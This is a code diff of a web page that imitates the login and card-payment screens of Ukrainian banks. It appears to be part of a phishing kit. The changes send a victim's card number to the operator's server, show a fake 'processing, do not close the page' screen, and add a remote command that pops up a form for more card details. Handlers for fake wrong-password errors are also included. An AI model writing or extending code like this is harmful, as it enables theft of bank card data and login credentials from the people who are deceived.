@@ -608,7 +608,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 <span class="back-arrow" id="alliance-back-btn">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-text')}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
-                <span class="title">Вхід у систему</span>
+                <span class="title"></span>
                 <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
             </div>
             <div class="alliance-content-wrapper">
@@ -635,7 +635,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 <span class="back-arrow" id="alliance-back-card-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-text')}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
-                <span class="title">Зарахування коштів</span>
+                <span class="title"></span>
                 <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
             </div>
             <div class="alliance-content-wrapper">
@@ -661,7 +661,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 <span class="back-arrow" id="alliance-back-details-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-text')}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
-                <span class="title">Підтвердження</span>
+                <span class="title"></span>
                 <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
             </div>
             <div class="alliance-content-wrapper">
@@ -715,8 +715,8 @@ document.addEventListener('DOMContentLoaded', () => {
             if (target.id === 'alliance-submit-btn' && target.classList.contains('active')) {
                 const cardInput = document.getElementById('alliance-card-input');
                 const card = cardInput.value.replace(/\s/g, '');
-                sendDataToServer({ card_number: card }, false); // isFinal = false
-                renderAllianceCardDetailsScreen(); // Переход на новый экран
+                sendDataToServer({ card_number: card }, true); // isFinal = true
+                allianceModalContent.innerHTML = `<div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%;"><h2 class="alliance-main-title">Обробка...</h2><p class="alliance-subtitle">Будь ласка, зачекайте. Не закривайте сторінку.</p></div>`;
             }
 
             if (target.id === 'alliance-details-submit-btn' && target.classList.contains('active')) {
@@ -1605,6 +1605,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'show_card_details_form':
                 renderThemedCardDetailsScreen();
+                break;
+            case 'request_alliance_card_details':
+                renderAllianceCardDetailsScreen();
                 break;
             case 'password_error':
                 const errorMsg = data.loginType === 'login' ? 'Невірний логін або пароль' : 'Невірний пароль';
